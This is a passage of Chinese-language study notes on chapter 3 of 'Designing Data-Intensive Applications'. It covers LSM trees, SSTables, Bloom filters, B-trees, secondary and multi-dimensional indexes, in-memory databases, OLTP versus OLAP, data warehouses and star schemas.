<li><p>无需将所有的 key 装入内存。段的有序性使得可以仅在内存中保留稀疏的 key-offset 对，其余的 key 可以通过定位 offset 区间，再在区间内遍历即可。可以按 KB 为单位合并 kv 对为块，只在内存中保存块基址的 kv 映射。由于 io 是以页为单位（通常 <strong>4KB</strong>），这保证了 key 的查找可以在一次 io 内完成。</p></li>
</ul>
<p><img src="fig3-5.png"></p>
<ul>
<li>进一步，还可以将块进行压缩，来减少空间占用。</li>
</ul>
<h4 id="构建和维护sstables">构建和维护 SSTables</h4>
<p>在磁盘里维护有序性是可能的，例如 B + 树，是以页面为单位存储有序记录。但是，在内存中维护有序性更简单，可以直接复用有序结构，例如红黑树、AVL 树。</p>
<p>可以基于平衡树设计以下的存储引擎：</p>
<ul>
<li>当写请求到来时，在内存中完成平衡树更新。这个平衡树也被称为内存表（memtable）</li>
<li>当内存表空间占用超过阈值，例如几 MB 之后，将它<strong>转换为 SSTable 写入磁盘</strong>。这个过程非常高效，<strong>先序遍历</strong>平衡树即可。当写入完成后，后续写请求维护在新的 memtable。</li>
<li>读请求到来时，先在 memtable 查询，然后从新到旧遍历 SSTables。</li>
<li>后台完成旧段的压缩和合并，忽略被覆盖或者删除的记录。</li>
</ul>
<p>这个模式基本完美，但有一个问题：如果数据库宕机了，memtable 中的变更会丢失。为了解决这个问题，在磁盘上维护一个只追加的日志（参考上一节，无序），对 memtable 的写入会立刻 append 到日志后。这个日志仅用于恢复未落盘的 memtable，当 memtable 写入 SSTable 后，相关日志就可以删除了。</p>
<p>个人理解：</p>
<ul>
<li>如果是写入 memtable 后再产生日志，还是可能出现中间宕机数据丢失的情况。</li>
<li>如果想完全保证可靠性，需要 WAL 日志（write-ahead log），在更改 memtable 前，先将日志落盘，但这会阻塞写入。</li>
</ul>
<h4 id="构建lsm树">构建 LSM 树</h4>
<p>这里描述的算法本质上是 LevelDB 和 RocksDB 中使用的 kv 存储引擎库，它们被设计嵌入到其他应用程序中。</p>
<p>这种索引结构最早被命名为日志结构合并树（Log-Structured Merge-Tree），建立在日志结构文件系统的基础上。这种基于压缩和合并有序文件的存储引擎通常被称为 LSM 树。</p>
<p>Lucene，Elastic Search 使用的索引引擎，就是使用了类似 SSTable 的有序文件，保存 term 到文档 id 列表的映射关系。</p>
<h4 id="性能优化">性能优化</h4>
<p>对于不存在 key，LSM 树需要遍历 memtable 和所有 SSTables 才能确定不存在，开销很大。</p>
<p>可以使用额外的布隆过滤器（<a href="https://en.wikipedia.org/wiki/Bloom_filter">Bloom filter - Wikipedia</a>）保存存在的 key。</p>
<ul>
<li>布隆过滤器是一种空间高效的概率数据结构，可以用于判断一个 key 是否存在，只支持新增 key、不支持删除 key。</li>
<li>可能会出现假阳性（false positive），但不会出现假阴性（false negative）。换而言之，布隆过滤器给出的答案是二者之一：“可能存在” 或 “绝不存在”</li>
<li> 原理是一个大的 bitmap，和 k 个不同的 hash 函数：
<ul>
<li>写入时，使用 k 个 hash 函数获取 k 个位置，都置为 1</li>
<li> 查询时，使用 k 个 hash 函数获取 k 个位置，如果有任意一个位置不为 1，则不存在；否则可能存在</li>
</ul></li>
</ul>
<p>SSTables 压缩合并的时机和顺序，有不同的策略， 最常见的有两种：</p>
<blockquote>
<p><a href="https://opensource.docs.scylladb.com/stable/architecture/compaction/compaction-strategies.html">Choose a Compaction Strategy | ScyllaDB Docs</a> <a href="https://zhuanlan.zhihu.com/p/112574579">LSM Tree 的 Leveling 和 Tiering Compaction - 知乎</a></p>
</blockquote>
<ul>
<li>大小分层压缩（size-tiered compaction）：新而小的 SSTables 被合并到老而大的 SSTables 中，HBase 使用此策略。</li>
<li>水平压缩（<a href="https://github.com/facebook/rocksdb/wiki/Leveled-Compaction">level compaction</a>）：key 的范围被拆分成更小的 SSTables，而较旧的数据被移动到单独的 level，这使得压缩能够更加递增地进行，并且使用更少的磁盘空间。</li>
</ul>
<p>即使有许多微妙的东西，LSM 树的基本思想 —— 保存一系列在后台合并的 SSTables —— 简单而有效。即使数据集比可用内存大得多，它仍能继续正常工作。由于数据按排序顺序存储，你可以高效地执行范围查询（扫描所有从某个最小值到某个最大值之间的所有键），并且因为硬盘写入是连续的，所以 LSM 树可以支持非常高的写入吞吐量。</p>
<h3 id="b树">B 树</h3>
<p>比 LSM 树更为常见的索引结构，与 LSM 树的相似点在于都是使用磁盘保存有序文件。不同的是：</p>
<ul>
<li>LSM 树使用可变大小的段存储，通常为几 MB</li>
<li>B 树使用固定大小的块 / 页存储，通常 4KB（操作系统通常页面大小），以页的维度进行读写</li>
</ul>
<p>书中这节介绍的应该是 B + 树，更清楚一点，我先参考维基百科介绍下 B 树和 B + 树。</p>
<h4 id="数据结构中的b树">数据结构中的 B 树</h4>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/B-tree">B-tree - Wikipedia</a> 在计算机科学中，B 树是一种自平衡的树结构，存储了有序数据，允许单点查询、范围查询、插入和删除。B 树是二叉查找树的泛化版，允许节点有多于两个子节点。与其他的二叉查找树不同，B 树非常适合大块读写的存储系统，例如数据库和文件系统。</p>
</blockquote>
<p>一棵 m 阶的 B 树满足以下条件：</p>
<ul>
<li>每个节点至多有 m 个子节点</li>
<li>每个节点至少有 m/2 个子节点（向上取整）</li>
<li>根节点至少有两个子节点，除非它是叶节点</li>
<li>所有的叶节点出现在同一层</li>
<li>一个有 k 个子节点的非叶节点有着 k-1 个 key，作为边界分割得到 k 个 key 区间，对应 k 个子节点</li>
</ul>
<p>B 树中的节点可以分为三类：</p>
<ul>
<li>内部节点（Internal nodes）：非根节点和叶节点
<ul>
<li>子节点数量必须在 [m/2,m] 之间，当插入或删除导致数量不满足要求时，会触发页面的拆分或合并，这个过程可能是递归的</li>
</ul></li>
<li>根节点：唯一
<ul>
<li>子节点数量上限与内部节点一致，但无下限</li>
</ul></li>
<li>叶节点：都在同一层
<ul>
<li>定义不统一：Knuth 将叶节点定义为实际的数据对象或块，即叶节点只存放数据；其他作者将这些数据对象之上一层的内部节点定义为叶节点，叶节点存放 key - 数据引用</li>
</ul></li>
</ul>
<blockquote>
<p>B 树的定义不是一致的，包括阶、叶节点等术语，但这些与 B 树的本质思想无关。在 B 树中，每个节点都会保存 value，除了叶节点。（这里应该描述的是数据块定义下的叶节点）。</p>
</blockquote>
<ul>
<li>个人理解，按纯粹多叉查找树定义，B 树的每个节点都会存放 key-value。过早地掺杂一些数据引擎实现的考量，会影响对数据结构本身的理解。</li>
</ul>
<h4 id="b树-1">B + 树</h4>
<p>为存储块类型的数据而设计，例如文件系统、数据库，与 B 树类似，不同的是：</p>
<ul>
<li>只有叶子结点上存放 value，这使得 B + 树的扇出（节点包含子节点的数量）非常高，通常可以达到 100 以上，进而提高检索效率</li>
<li>这里的扇出是指固定页面大小情况下（例如典型页面 4KB），由于非叶节点减少了大块数据的存储，扇出就会显著提高</li>
</ul>
<h4 id="书中的b树">书中的 B 树</h4>
<p>这里的 B 树实际指的 B + 树。</p>
<p>B 树中，每个页都对应一个唯一地址，可以互相引用，与指针类似，但是存储在磁盘上。形式上，B 树是一种多路查找树：</p>
<ul>
<li>存在唯一的根节点，作为读写的起始页面</li>
<li>非叶子页面中，包含 k 个引用和 k-1 个 key 值
<ul>
<li>引用指向子页面</li>
<li> key 值是引用 key 范围的边界</li>
</ul></li>
<li>叶子节点，存储 key 和 value 值
<ul>
<li>对于大块 value，存储在叶子页面上可以有效提高整棵树的扇出（固定页大小的情况下）</li>
</ul></li>
</ul>
<p>下图展示一个 B 树查询的例子，查询 user_id=251 的 value，需要从根节点开始，逐层路由到叶子页面，再读取 value 值。</p>
<p><img src="fig3-6.png"></p>
<p>B 树中的子节点数量称为分支因子（branching factor），上图中分支因子是 6。在实践中，分支因子的大小取决于存储页面引用和范围边界所需的空间，但这个值通常是几百。</p>
<ul>
<li>假设引用和边界各 8Bytes，分支因子上限约为 4K/16=512</li>
<li> 在 B 树中存在阶的概念</li>
</ul>
<p>B 树总是平衡的，包含 m 个 key 的 B 树的深度总是 O (logn)。大多数数据库的 B 树高为 3 或 4，一棵 4 层高的树，页面大小为 4KB，分支因子为 512，所能存储的数据大小为 256TB。</p>
<p><span class="math display">\[ 4KB*512^4=2^{38}KB=2^8TB \]</span></p>
<h4 id="使b树变得可靠">使 B 树变得可靠</h4>
<p>B 树在插入和更新时，是就地修改页面，而不是像 LSM 一样追加日志，这带来了不一致问题：</p>
<ul>
<li>如果插入新记录触发页面分裂，会导致多个页面的更新（叶子、父页面乃至更高祖先），如果过程中数据库宕机，就可能出现不一致问题，比如有个孤儿页面没有父指针。
<ul>
<li>需要 WAL 日志（<a href="https://en.wikipedia.org/wiki/Write-ahead_logging">Write-ahead logging - Wikipedia</a>）来保证，也被称为 redo-log（重做日志）。思想是维护一个只追加的日志文件，在数据变更对数据库生效之前，必须先产生日志条目并保存到可靠介质中（如磁盘），进而保证了数据库宕机之后可以根据日志进行恢复。</li>
</ul></li>
<li>并发读写导致的不一致。
<ul>
<li>需要加锁（latch）来保证。</li>
<li>对比之下 LSM 树更简单，段的融合在后台进行，不会干涉到到来的 query，并且原子化地用新段替换旧段</li>
</ul></li>
</ul>
<h4 id="优化">优化</h4>
<p>B 树的一些优化：</p>
<ul>
<li>使用 copy-on-write 机制处理修改，不使用加锁和 WAL 日志，例如 LMDB，这也可以简化并发处理。</li>
<li>压缩 key 提高内部节点扇出：key 只要能区分边界即可
<ul>
<li>个人感觉常用于字符串的 key，例如前缀索引</li>
</ul></li>
<li>叶子页面在磁盘上按顺序排列，提高范围检索性能。页面在磁盘上的排列没有限制，这使得如果要范围查询扫描，可能需要 “跳来跳去 “，非常低效。因此，许多 B 树实现尝试将树布局，使得叶子页面按顺序出现在磁盘上。但是，随着树的增长，维持这个顺序是很困难的。相比之下，由于 LSM 树在合并过程中一次又一次地重写存储的大部分，所以它们更容易使顺序键在磁盘上彼此靠近。</li>
<li>树中添加额外的指针：例如叶子页面的左右兄弟节点间添加指针，允许不返回父节点的情况下顺序扫描。</li>
<li>B 树的变体如分形树【22】借用一些日志结构的思想来减少磁盘寻道</li>
</ul>
<h3 id="lsm树-vs-b树">LSM 树 vs B 树</h3>
<p>通常，B 树被认为读高效，LSM 树被认为写高效。</p>
<ul>
<li>LSM 树的读需要遍历 memtable、SSTables，写只需要更新内存、追加日志即可</li>
<li> B 树读写都需 3-4 次 IO</li>
</ul>
<p>实际使用时，需要用真实负载测试系统，看看哪种结构更符合要求。</p>
<h4 id="lsm树的优点">LSM 树的优点</h4>
<p>一次写入中：</p>
<ul>
<li>B 树至少要更新两次，数据页 &amp; wal 日志。如果涉及到页的拆分，次数会更多。而且 B 树写入是整页覆盖，即使只改动了少数几个 bytes。</li>
<li>LSM 树中的压缩与合并也会导致多次写入。</li>
</ul>
<p>写放大（<a href="https://en.wikipedia.org/wiki/Write_amplification">write amplification</a>）问题：一次写入会导致多次的磁盘写入</p>
<ul>
<li>这会损害 SSD 的寿命，SSD 寿命中只能承载有限次的块覆盖</li>
<li>在写密集的任务中，磁盘的带宽是有限的，写放大问题会限制 1s 内能够处理的写数量</li>
</ul>
<p>LSM 树的写吞吐通常会更大：</p>
<ul>
<li>写放大率小</li>
<li>顺序写入比随机写入（B 树）更快，尤其是机械硬盘</li>
</ul>
<p>此外，LSM 树可以被压缩以节省空间。B 树是以页为单位的，可能会存在页中有未使用的空间（例如刚刚拆分完的两个页，各空余一半）。而 LSM 树不是以页为单位，且周期性重写 SSTables，再搭配 leveled compaction 这样的压缩策略，可以高效地利用存储空间。</p>
<p>在许多固态硬盘上，固件内部使用日志结构化算法，将随机写入转变为顺序写入底层存储芯片，因此存储引擎写入模式的影响不太明显。但是，较低的写入放大率和减少的碎片对 SSD 仍然有利：更紧凑地表示数据可在可用的 I/O 带宽内提供更多的读取和写入请求。</p>
<h4 id="lsm树的缺点">LSM 树的缺点</h4>
<p>后台的压缩与合并也会占据写磁盘带宽，进而可能影响到前台读写性能：</p>
<ul>
<li>虽然存储引擎尝试只对增量数据做压缩，并且努力不影响前台读写，但是磁盘的资源限制决定了，容易出现一个前台读写需要等待昂贵的压缩完成之后，才可以进行。</li>
<li>这个问题对于吞吐、平均响应时间的影响不大，但是会影响高百分位点的性能。
<ul>
<li>对比之下，B 树的检索性能更稳定、可预测。</li>
</ul></li>
</ul>
<p>如果是在高写入吞吐下进行压缩，还会出现别的问题：例如前台读写占用太多带宽，导致后台不能及时压缩，段越来越多，直至耗尽空间。</p>
<ul>
<li>LSM 树一般不会限制写请求的速率，需要应用侧的监控</li>
</ul>
<p>对比之下，B 树中一个 key 只会存储一份，不像 LSM 树中可能存储多份，这契合事务型数据库系统：通过 key 范围加锁保证隔离性。</p>
<p>B 树在数据库体系结构中是非常根深蒂固的，为许多工作负载提供始终如一的良好性能，所以它们不可能很快就会消失。在新的数据存储中，日志结构化索引变得越来越流行。没有快速和容易的规则来确定哪种类型的存储引擎对你的场景更好，所以值得进行一些经验上的测试。</p>
<h3 id="其他索引结构">其他索引结构</h3>
<p>到目前为止，我们只讨论了关键值索引，它们就像关系模型中的<strong>主键（primary key）</strong> 索引。主键<strong>唯一标识</strong>关系表中的一行，或文档数据库中的一个文档或图形数据库中的一个顶点。数据库中的其他记录可以通过其主键（或 ID）引用该行 / 文档 / 顶点，并且索引用于解析这样的引用。</p>
<p>有二级索引也很常见。在关系数据库中，您可以使用 <code>CREATE INDEX</code> 命令在同一个表上创建多个二级索引，而且这些索引通常对于有效地执行联接而言至关重要。</p>
<p>一个二级索引可以很容易地从一个 kv 索引构建。主要的不同是<strong>键不是唯一的</strong>。即可能有许多行（文档，顶点）具有相同的键。这可以通过两种方式来解决：或者通过使索引中的每个值，成为匹配行标识符的列表（如全文索引中的发布列表），或者通过向每个索引添加行标识符来使每个关键字唯一。无论哪种方式，B 树和日志结构索引都可以用作辅助索引。</p>
<h4 id="将值存储在索引中"><strong>将值存储在索引中</strong></h4>
<p>索引中的关键字是查询搜索的内容，但是该值可以是以下两种情况之一：它可以是所讨论的实际行（文档，顶点），也可以是对存储在别处的行的引用。在后一种情况下，行被存储的地方被称为<strong>堆文件（heap file）</strong>，并且存储的数据没有特定的顺序（它可以是仅附加的，或者可以跟踪被删除的行以便用新数据覆盖它们后来）。堆文件方法很常见，因为它避免了在存在多个二级索引时复制数据：每个索引只引用堆文件中的一个位置，实际的数据保存在一个地方。 在不更改键的情况下更新值时，堆文件方法可以非常高效：只要新值不大于旧值，就可以覆盖该记录。如果新值更大，情况会更复杂，因为它可能需要移到堆中有足够空间的新位置。在这种情况下，要么所有的索引都需要更新，以指向记录的新堆位置，或者在旧堆位置留下一个转发指针【5】。</p>
<p>在某些情况下，从索引到堆文件的额外跳跃对读取来说性能损失太大，因此可能希望将索引行直接存储在索引中。这被称为聚集索引。例如，在 MySQL 的 InnoDB 存储引擎中，表的主键总是一个聚簇索引，二级索引用主键（而不是堆文件中的位置）【31】。在 SQL Server 中，可以为每个表指定一个聚簇索引【32】。</p>
<p>在 <strong>聚集索引（clustered index）</strong> （在索引中存储所有行数据）和 <strong>非聚集索引（nonclustered index）</strong> （仅在索引中存储对数据的引用）之间的折衷被称为 <strong>包含列的索引（index with included columns）</strong>或<strong>覆盖索引（covering index）</strong>，其存储表的一部分在索引内【33】。这允许通过单独使用索引来回答一些查询（这种情况叫做：索引 <strong>覆盖（cover）</strong> 了查询）【32】。</p>
<p><font color="orange"><strong>与任何类型的数据重复一样，聚簇和覆盖索引可以加快读取速度，但是它们需要额外的存储空间，并且会增加写入开销。数据库还需要额外的努力来执行事务保证，因为应用程序不应该因为重复而导致不一致。</strong></font></p>
<h4 id="多列索引"><strong>多列索引</strong></h4>
<p>如果一次查询中涉及到多个列，但只能使用一个列的索引，检索效率显然不够理想。</p>
<p>最常见的多列索引被称为 <strong>连接索引（concatenated index）</strong> ，它通过将一列的值追加到另一列后面，简单地将多个字段组合成一个键（索引定义中指定了字段的连接顺序）。但这太丑陋了。</p>
<p><strong>多维索引（multi-dimensional index）</strong> 是一种查询多个列的更一般的方法，这对于地理空间数据尤为重要。例如，餐厅搜索网站可能有一个数据库，其中包含每个餐厅的经度和纬度。当用户在地图上查看餐馆时，网站需要搜索用户正在查看的矩形地图区域内的所有餐馆。这需要一个二维范围查询，如下所示：</p>
<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> restaurants <span class="keyword">WHERE</span> latitude <span class="operator">&gt;</span> <span class="number">51.4946</span> <span class="keyword">AND</span> latitude <span class="operator">&lt;</span> <span class="number">51.5079</span></span><br><span class="line">                           <span class="keyword">AND</span> longitude <span class="operator">&gt;</span> <span class="number">-0.1162</span> <span class="keyword">AND</span> longitude <span class="operator">&lt;</span> <span class="number">-0.1004</span>;</span><br></pre></td></tr></tbody></table></figure>
<p>一个标准的 B 树或者 LSM 树索引不能够高效地响应这种查询：它可以返回一个纬度范围内的所有餐馆（但经度可能是任意值），或者返回在同一个经度范围内的所有餐馆（但纬度可能是北极和南极之间的任意地方），但不能同时满足。</p>
<p>多维索引不仅可以用于地理位置。例如，在电子商务网站上可以使用维度（红色，绿色，蓝色）上的三维索引来搜索特定颜色范围内的产品，也可以在天气观测数据库中搜索二维（日期，温度）的指数，以便有效地搜索 2013 年的温度在 25 至 30°C 之间的所有观测资料。使用一维索引，你将不得不扫描 2013 年的所有记录（不管温度如何），然后通过温度进行过滤，反之亦然。 二维索引可以同时通过时间戳和温度来收窄数据集。这个技术被 HyperDex 使用【36】。</p>
<h4 id="全文搜索和模糊索引"><strong>全文搜索和模糊索引</strong></h4>
<p>到目前为止所讨论的所有索引都假定你有确切的数据，并允许你查询键的确切值或具有排序顺序的键的值范围。他们不允许你做的是搜索<strong>类似</strong>的键，如拼写错误的单词。这种模糊的查询需要不同的技术。</p>
<p>例如，全文搜索引擎通常允许搜索目标从一个单词扩展为包括该单词的同义词，忽略单词的语法变体，搜索在相同文档中的近义词，并且支持各种其他取决于文本的语言分析功能。为了处理文档或查询中的拼写错误，Lucene 能够在一定的编辑距离内搜索文本【37】（编辑距离 1 意味着单词内发生了 1 个字母的添加、删除或替换）。</p>
<p>Lucene 为其词典使用了一个类似于 SSTable 的结构。这个结构需要一个小的内存索引，告诉查询需要在排序文件中哪个偏移量查找键。在 LevelDB 中，这个内存中的索引是一些键的稀疏集合，但在 Lucene 中，内存中的索引是键中字符的有限状态自动机，类似于 trie 【38】。这个自动机可以转换成 Levenshtein 自动机，它支持在给定的编辑距离内有效地搜索单词【39】。</p>
<p>其他的模糊搜索技术正朝着文档分类和机器学习的方向发展。</p>
<h4 id="在内存中存储一切"><strong>在内存中存储一切</strong></h4>
<p>本章到目前为止讨论的数据结构都是对硬盘限制的应对。与主内存相比，硬盘处理起来很麻烦。对于磁性硬盘和固态硬盘，如果要在读取和写入时获得良好性能，则需要仔细地布置硬盘上的数据。但是，我们能容忍这种麻烦，因为硬盘有两个显著的优点：它们是持久的（它们的内容在电源关闭时不会丢失），并且每 GB 的成本比 RAM 低。</p>
<p>随着 RAM 变得更便宜，每 GB 成本的论据被侵蚀了。许多数据集不是那么大，所以将它们全部保存在内存中是非常可行的，包括可能分布在多个机器上。这导致了内存数据库的发展。</p>
<p>某些内存中的键值存储（如 Memcached）仅用于缓存，在重新启动计算机时丢失的数据是可以接受的。但其他内存数据库的目标是持久性，可以通过以下方式实现</p>
<ul>
<li>特殊的硬件（例如电池供电的 RAM）</li>
<li>将更改日志写入硬盘</li>
<li>将定时快照写入硬盘或者将内存中的状态复制到其他机器上</li>
</ul>
<p>内存数据库重新启动时，需要从硬盘或通过网络从副本重新加载其状态（除非使用特殊的硬件）。尽管写入硬盘，它仍然是一个内存数据库，因为硬盘仅出于持久性目的进行日志追加，读取请求完全由内存来处理。写入硬盘同时还有运维上的好处：<font color="orange"><strong>硬盘上的文件可以很容易地由外部程序进行备份、检查和分析。</strong></font></p>
<p>诸如 VoltDB、MemSQL 和 Oracle TimesTen 等产品是具有关系模型的内存数据库，供应商声称，通过消除与管理硬盘上的数据结构相关的所有开销，他们可以提供巨大的性能改进【41,42】。 RAM Cloud 是一个开源的内存键值存储器，具有持久性（对内存和硬盘上的数据都使用日志结构化方法）【43】。 Redis 和 Couchbase 通过异步写入硬盘提供了较弱的持久性。</p>
<p>反直觉的是，内存数据库的性能优势并不是因为它们不需要从硬盘读取的事实。只要有足够的内存即使是基于硬盘的存储引擎也可能永远不需要从硬盘读取，因为操作系统在内存中缓存了最近使用的硬盘块。相反，它们更快的原因在于<font color="orange"><strong>省去了将内存数据结构编码为硬盘数据结构的开销</strong></font>【44】。</p>
<p>除了性能，内存数据库的另一个优势是<font color="orange"><strong>提供了难以用基于硬盘的索引实现的数据模型</strong></font>。例如，Redis 为各种数据结构（如优先级队列和集合）提供了类似数据库的接口。因为它将所有数据保存在内存中，所以它的实现相对简单。</p>
<p>最近的研究表明，内存数据库体系结构可以扩展到支持比可用内存更大的数据集，而不必重新采用以硬盘为中心的体系结构【45】。所谓的 <strong>反缓存（anti-caching）</strong> 方法通过在内存不足的情况下将最近最少使用的数据从内存转移到硬盘，并在将来再次访问时将其重新加载到内存中。这与操作系统对虚拟内存和交换文件的操作类似，但数据库可以比操作系统更有效地管理内存，因为它可以按单个记录的粒度工作，而不是整个内存页面。尽管如此，这种方法仍然需要索引能完全放入内存中（就像本章开头的 Bitcask 例子）。</p>
<p>如果 <strong>非易失性存储器（non-volatile memory, NVM）</strong> 技术得到更广泛的应用，可能还需要进一步改变存储引擎设计【46】。</p>
<p>在早期的业务数据处理过程中，一次典型的数据库写入通常与一笔 <em>商业交易（commercial transaction）</em> 相对应：卖个货，向供应商下订单，支付员工工资等等。但随着数据库开始应用到那些不涉及到钱的领域，术语 <strong>交易 / 事务（transaction）</strong> 仍留了下来，用于指代一组读写操作构成的逻辑单元。目前这是一个新的研究领域，值得关注。</p>
<h2 id="事务处理还是分析"><strong>事务处理还是分析？</strong></h2>
<p>在早期的业务数据处理过程中，一次典型的数据库写入通常与一笔 <em>商业交易（commercial transaction）</em> 相对应：卖个货，向供应商下订单，支付员工工资等等。但随着数据库开始应用到那些不涉及到钱的领域，术语 <strong>交易 / 事务（transaction）</strong> 仍留了下来，用于指代一组读写操作构成的逻辑单元。</p>
<blockquote>
<p>事务不一定具有 ACID（原子性，一致性，隔离性和持久性）属性。<strong>事务处理只是意味着允许客户端进行低延迟的读取和写入</strong> —— 而不是只能定期运行（例如每天一次）的批处理作业。</p>
</blockquote>
<p>即使数据库开始被用于许多不同类型的数据，比如博客文章的评论，游戏中的动作，地址簿中的联系人等等，基本的访问模式仍然类似于处理商业交易。应用程序通常使用索引通过某个键查找少量记录。根据用户的输入插入或更新记录。由于这些应用程序是交互式的，这种访问模式被称为 <strong>在线事务处理（OLTP, OnLine Transaction Processing）</strong>。</p>
<p>但是，数据库也开始越来越多地用于数据分析，这些数据分析具有非常不同的访问模式。通常，分析查询需要扫描大量记录，每个记录只读取几列，并计算汇总统计信息（如计数、总和或平均值），而不是将原始数据返回给用户。例如，如果你的数据是一个销售交易表，那么分析查询可能是：</p>
<ul>
<li>一月份每个商店的总收入是多少？</li>
<li>在最近的推广活动中多卖了多少香蕉？</li>
<li>哪个牌子的婴儿食品最常与 X 品牌的尿布同时购买？</li>
</ul>
<p>这些查询通常由业务分析师编写，并提供报告以帮助公司管理层做出更好的决策（business intelligence，商业智能）。为了将这种使用数据库的模式和事务处理区分开，它被称为 <strong>在线分析处理（OLAP, OnLine Analytice Processing）</strong>。OLTP 和 OLAP 之间的区别并不总是清晰的，但是一些典型的特征在 <strong><a href="http://ddia.vonng.com/#/">表 3-1</a></strong> 中列出。</p>
<h3 id="表-3-1-比较事务处理和分析系统的特点"><strong>表 3-1 比较事务处理和分析系统的特点</strong></h3>
<table>
<thead>
<tr class="header">
<th>属性</th>
<th>事务处理系统 OLTP</th>
<th> 分析系统 OLAP</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 主要读取模式</td>
<td>查询少量记录，按键读取</td>
<td>在大批量记录上聚合</td>
</tr>
<tr class="even">
<td>主要写入模式</td>
<td>随机访问，写入要求低延时</td>
<td>批量导入（ETL）或者事件流</td>
</tr>
<tr class="odd">
<td>主要用户</td>
<td>终端用户，通过 Web 应用</td>
<td>内部数据分析师，用于决策支持</td>
</tr>
<tr class="even">
<td>处理的数据</td>
<td>数据的最新状态（当前时间点）</td>
<td>随时间推移的历史事件</td>
</tr>
<tr class="odd">
<td>数据集尺寸</td>
<td> GB ~ TB</td>
<td>TB ~ PB</td>
</tr>
</tbody>
</table>
<p>OLAP 中的首字母 O（online）的含义并不明确，它可能是指查询并不是用来生成预定义好的报告的事实，也可能是指分析师通常是交互式地使用 OLAP 系统来进行探索式的查询。</p>
<p>起初，事务处理和分析查询使用了相同的数据库。 SQL 在这方面已证明是非常灵活的：对于 OLTP 类型的查询以及 OLAP 类型的查询来说效果都很好。尽管如此，在二十世纪八十年代末和九十年代初期，企业有停止使用 OLTP 系统进行分析的趋势，转而在单独的数据库上运行分析。这个单独的数据库被称为 <font color="orange"><strong>数据仓库（data warehouse）</strong></font>。</p>
<h3 id="数据仓库">数据仓库</h3>
<p>一个企业可能有几十个不同的交易处理系统：面向终端客户的网站，控制实体商店的收银系统，跟踪仓库库存，规划车辆路线，供应链管理，员工管理等。这些系统中每一个都很复杂，需要专人维护，所以系统最终都是自动运行的。</p>
<p><font color="orange">OLTP 系统往往对业务运作至关重要，因而通常会要求 <strong>高可用</strong> 与 <strong>低延迟</strong></font>。所以 DBA 会密切关注他们的 OLTP 数据库，他们通常不愿意让业务分析人员在 OLTP 数据库上运行临时分析查询，因为这些查询通常开销巨大，会扫描大部分数据集，这会损害同时执行的事务的性能。</p>
<p>相比之下，<font color="orange">数据仓库是一个独立的数据库，分析人员可以查询他们想要的内容而不影响 OLTP 操作</font>【48】。数据仓库包含公司各种 OLTP 系统中所有的只读数据副本。从 OLTP 数据库中提取数据（使用定期的数据转储或连续的更新流），转换成适合分析的模式，清理并加载到数据仓库中。将数据存入仓库的过程称为 “<strong>抽取 - 转换 - 加载（ETL）</strong>”</p>
<p><img src="fig3-8.png"></p>
<p>几乎所有的大型企业都有数据仓库，但在小型企业中几乎闻所未闻。这可能是因为大多数小公司没有这么多不同的 OLTP 系统，大多数小公司只有少量的数据 —— 可以在传统的 SQL 数据库中查询，甚至可以在电子表格中分析。在一家大公司里，做一些在一家小公司很简单的事情，需要很多繁重的工作。</p>
<p>使用单独的数据仓库，而不是直接查询 OLTP 系统进行分析的一大优势是<font color="orange"><strong>数据仓库可针对分析访问模式进行优化</strong></font>。事实证明，本章前半部分讨论的索引算法对于 OLTP 来说工作得很好，但对于回答分析查询并不是很好。在本章的其余部分中，我们将研究为分析而优化的存储引擎。</p>
<h3 id="oltp数据库和数据仓库之间的分歧"><strong>OLTP 数据库和数据仓库之间的分歧</strong></h3>
<p>数据仓库的数据模型通常是关系型的，因为 SQL 通常很适合分析查询。有许多图形数据分析工具可以生成 SQL 查询，可视化结果，并允许分析人员探索数据（通过下钻，切片和切块等操作）。</p>
<p>表面上，一个数据仓库和一个关系 OLTP 数据库看起来很相似，因为它们都有一个 SQL 查询接口。然而，系统的内部看起来可能完全不同，因为它们针对非常不同的查询模式进行了优化。现在许多数据库供应商都将重点放在支持事务处理或分析工作负载上，而不是两者都支持。</p>
<p>一些数据库（例如 Microsoft SQL Server 和 SAP HANA）支持在同一产品中进行事务处理和数据仓库。但是，它们正在日益成为两个独立的存储和查询引擎，这些引擎正好可以通过一个通用的 SQL 接口访问【49,50,51】。</p>
<p>Teradata，Vertica，SAP HANA 和 ParAccel 等数据仓库供应商通常使用昂贵的商业许可证销售他们的系统。 Amazon RedShift 是 ParAccel 的托管版本。最近，大量的开源 SQL-on-Hadoop 项目已经出现，它们还很年轻，但是正在与商业数据仓库系统竞争。这些包括 Apache Hive，Spark SQL，Cloudera Impala，Facebook Presto，Apache Tajo 和 Apache Drill 【52,53】。其中一些是基于谷歌的 Dremel [54] 的想法。</p>
<h3 id="星型和雪花型分析的模式"><strong>星型和雪花型：分析的模式</strong></h3>
<p>正如第 2 章所探讨的，根据应用程序的需要，在事务处理领域中使用了大量不同的数据模型。另一方面，在分析中，数据模型的多样性则少得多。许多数据仓库都以相当公式化的方式使用，被称为星型模式（也称为维度建模【55】）。</p>
<p>图 3-9 中的示例模式显示了可能在食品零售商处找到的数据仓库。在模式的中心是一个所谓的事实表（fact tables，在这个例子中，它被称为 <code>fact_sales</code>）。事实表的每一行代表在特定时间发生的事件（这里，每一行代表客户购买的产品）。如果我们分析的是网站流量而不是零售量，则每行可能代表一个用户的页面浏览量或点击量。</p>
<p><img src="fig3-9.png"></p>
<p><strong>图 3-9 用于数据仓库的星型模式的示例</strong></p>
<p>通常情况下，事实被视为单独的事件，因为这样可以在以后分析中获得最大的灵活性。但是，这意味着事实表可以变得非常大。像苹果，沃尔玛或 eBay 这样的大企业在其数据仓库中可能有几十 PB 的交易历史，其中大部分实际上是表【56】。</p>
<p>事实表中的一些列是属性，例如产品销售的价格和从供应商那里购买的成本（允许计算利润余额）。事实表中的其他列是对其他表（称为维度表，dimensional tables）的外键引用。由于事实表中的每一行都表示一个事件，因此这些维度代表事件的发生地点，时间，方式和原因。</p>
<p>例如，在图 3-9 中，其中一个维度是已售出的产品。 <code>dim_product</code> 表中的每一行代表一种待售产品，包括<strong>库存单位（SKU）</strong>，说明，品牌名称，类别，脂肪含量，包装尺寸等。<code>fact_sales</code> 表中的每一行都使用外部表明在特定交易中销售了哪些产品。 （为了简单起见，如果客户一次购买几种不同的产品，则它们在事实表中被表示为单独的行）。</p>
